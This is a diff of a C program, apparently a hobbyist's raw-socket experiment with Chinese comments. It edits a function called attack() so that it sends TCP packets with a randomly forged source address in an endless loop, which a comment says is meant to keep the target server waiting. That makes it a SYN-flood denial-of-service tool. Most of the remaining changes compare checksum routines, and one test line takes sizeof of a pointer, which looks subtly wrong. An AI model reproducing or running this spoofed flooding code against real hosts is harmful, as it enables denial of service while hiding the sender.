@@ -22,6 +22,7 @@ void attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport);
 unsigned short check_sum(unsigned short *addr,int len);
 
 unsigned short my_checksum(const unsigned char *data, int length);
+unsigned short test_check_sum(const unsigned char *ptr, int length);
 
 
 int
@@ -142,24 +143,26 @@ attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport)
 	char str4[INET_ADDRSTRLEN];
 	srand(time(NULL));
 
-	char *addr1 = "192.168.1.221";
+	//char *addr1 = "192.168.1.221";
 	char recv_buf[128];
 	memset(recv_buf, 0, sizeof(recv_buf));
 	socklen_t addrlen = sizeof(struct sockaddr_in);
 	while (1) {
 		/* 源地址伪造，我们随便任意生成个地址，让服务器一直等待下去 */
-		//ip_head->ip_src.s_addr = random();
+		ip_head->ip_src.s_addr = random();
 		//printf("sum = %08X\n", my_checksum((unsigned char *) ip_head, sizeof(struct ip)));
 
-		inet_pton(AF_INET, addr1, &(ip_head->ip_src));
+		//inet_pton(AF_INET, addr1, &(ip_head->ip_src));
 		inet_ntop(AF_INET, &(ip_head->ip_src), str4, sizeof(str4));
 		printf("ip = %s\n", str4);
 
-	printf("ip header = %d:\n", sizeof(struct ip));
-	for (i = 0; i < sizeof(struct ip); ++i) {
-		printf("%02X ", (unsigned char) buf[i]);
-	}
-	printf("\n\n");
+/*
+		printf("ip header = %d:\n", sizeof(struct ip));
+		for (i = 0; i < sizeof(struct ip); ++i) {
+			printf("%02X ", (unsigned char) buf[i]);
+		}
+		printf("\n\n");
+*/
 
 		psd_header.ip_src = ip_head->ip_src;
 		psd_header.ip_dst = ip_head->ip_dst;
@@ -168,23 +171,28 @@ attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport)
 		memcpy(tcp_buf, &psd_header, sizeof(psd_header));
 		memcpy(tcp_buf + sizeof(psd_header), tcp_head, sizeof(struct tcphdr));
 
+
+
 		/* TCP首部校验和 */
 		//tcp_head->check = my_checksum((unsigned char *) tcp_head, sizeof(struct tcphdr));
 		//tcp_head->check = my_checksum(tcp_buf, sizeof(struct tcphdr) + sizeof(psd_header));
+		tcp_head->check = check_sum((unsigned short *) tcp_head, sizeof(struct tcphdr));
+
 		sendto(fd, buf, ip_len, 0, (struct sockaddr *) svaddr, sizeof(struct sockaddr_in));
 
 		/* 发送后我们是不是可以使用recvfrom()来接收服务器的SYN+ACK包呢 */
-		ssize_t nbytes = recvfrom(fd, recv_buf, sizeof(recv_buf), 0,
-			(struct sockaddr *) svaddr, &addrlen);
-		printf("recv %d bytes\n", nbytes);
+		//ssize_t nbytes = recvfrom(fd, recv_buf, sizeof(recv_buf), 0,
+		//	(struct sockaddr *) svaddr, &addrlen);
+		//printf("recv %d bytes\n", nbytes);
 
 
-
-	printf("tcp len = %d\n", sizeof(struct tcphdr));
-	for (i = sizeof(struct ip); i < sizeof(struct ip) + sizeof(struct tcphdr); ++i) {
-		printf("%02X ", (unsigned char) buf[i]);
-	}
-	printf("\n\n");
+/*
+		printf("tcp len = %d\n", sizeof(struct tcphdr));
+		for (i = sizeof(struct ip); i < sizeof(struct ip) + sizeof(struct tcphdr); ++i) {
+			printf("%02X ", (unsigned char) buf[i]);
+		}
+		printf("\n\n");
+*/
 
 		sleep(3);
 	}
@@ -197,6 +205,7 @@ attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport)
 
 /*
  * CRC校验和的计算
+ * 原网页版本校验算法
  */
 unsigned short check_sum(unsigned short *addr,int len){
         register int nleft=len;
@@ -281,7 +290,13 @@ TCP包的总长度用IP包中的总长度0x34-IP包的长度0x14(定长20)=0x20�
 tcp校验和的检验。
 */
 
-unsigned short my_checksum(const unsigned char *data, int length)
+
+/*
+ * 这个是我自己写的校验
+ * 这个算出的结果就是大端的，不用再转化为大端的
+ */
+unsigned short
+my_checksum(const unsigned char *data, int length)
 {
 	unsigned int sum = 0;
 	int i;
@@ -303,26 +318,50 @@ unsigned short my_checksum(const unsigned char *data, int length)
 }
 
 
-unsigned short checksum_v2(unsigned short *buf, int nword)
+
+/*
+ * UNP 28.8 节校验函数
+ * 小端模式下算出来的是小端的结果，所以应该还要用htos()转为大端，问题是究竟
+ * 要不要转为网络字节序，UNP图28-14的代码那里没看到有转啊???
+ */
+unsigned short
+in_cksum(unsigned short *addr, int len)
 {
-    unsigned long sum;
+	int nleft = len;
+	unsigned int sum = 0;
+	unsigned short *w = addr;
+	unsigned short answer = 0;
+
+	while (nleft > 1) {
+		sum += *w++;
+		nleft -= 2;
+	}
+
+	if (nleft == 1) {
+		*((unsigned char *) &answer) = *((unsigned char *) w);
+		sum += answer;
+	}
+
+	sum = (sum >> 16) + (sum &0xFFFF);
+	sum += (sum >> 16);
+	answer = ~sum;
  
-    for(sum = 0; nword > 0; nword--)
-        sum += *buf++;
- 
-    sum = (sum>>16) + (sum&0xffff);
-    sum += (sum>>16);
- 
-    return ~sum;
+	return answer;
 }
 
 
+
+/*
+ * 测试用的
+ */
 unsigned short
-tcp_check_sum(const unsigned char *ptr, int length)
+test_check_sum(const unsigned char *ptr, int length)
 {
 	int i;
+	unsigned short cksum = 0;
+	unsigned char *s = (unsigned char *) &cksum;
 /*
-	unsigned char data[] = {
+	unsigned char tcp_data[] = {
 		0xC0, 0xA8, 0x01, 0xCD,
 		0x6F, 0x0D, 0x64, 0x5C,
 		0x00,
@@ -340,7 +379,7 @@ tcp_check_sum(const unsigned char *ptr, int length)
 		0x00, 0x00};
 */
 
-	unsigned char data[] = {
+	unsigned char tcp_data[] = {
 		0xC0, 0xA8, 0x9F, 0x01,
 		0xC0, 0xA8, 0x9F, 0x82,
 		0x00,
@@ -358,35 +397,24 @@ tcp_check_sum(const unsigned char *ptr, int length)
 		0x00, 0x00,
 		0x61, 0x62, 0x63};
 
+	unsigned char my_data[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
+
+
+	unsigned char *data = my_data;
 
 	length = sizeof(data);
 
-	//exit(1);
-
-	//printf("len = %d\n", length);
-	//for (i = 0; i < length; ++i) {
-	//	printf("%02X ", data[i]);
-	//}
-	//printf("\n");
 
 
-	unsigned int sum = 0;
-/*
-	for (i = 0; i < length; ++i) {
-		if (i % 2 == 0)
-			sum += (data[i] << 8);
-		else
-			sum += data[i];
-	}
-	printf("sum = %08X\n", sum);
+	cksum = my_checksum(data, length);
+	printf("cksum = %04X, s[0] = %02X, s[1] = [%02X]\n", cksum, s[0], s[1]);
 
-	while ((sum >> 16) != 0x00) {
-		sum = (sum & 0xFFFF) + (sum >> 16);
-	}
-	printf("sum = %08X\n", sum);
-*/
-	unsigned short cs = my_checksum(data, length);
-	printf("cs = %04X\n", cs);
+	cksum = in_cksum((unsigned short *) data, length);
+	printf("cksum = %04X, bigend = [%02X][%02X]\n", cksum, s[0], s[1]);
+
+
+	
+
 	exit(1);
 
 
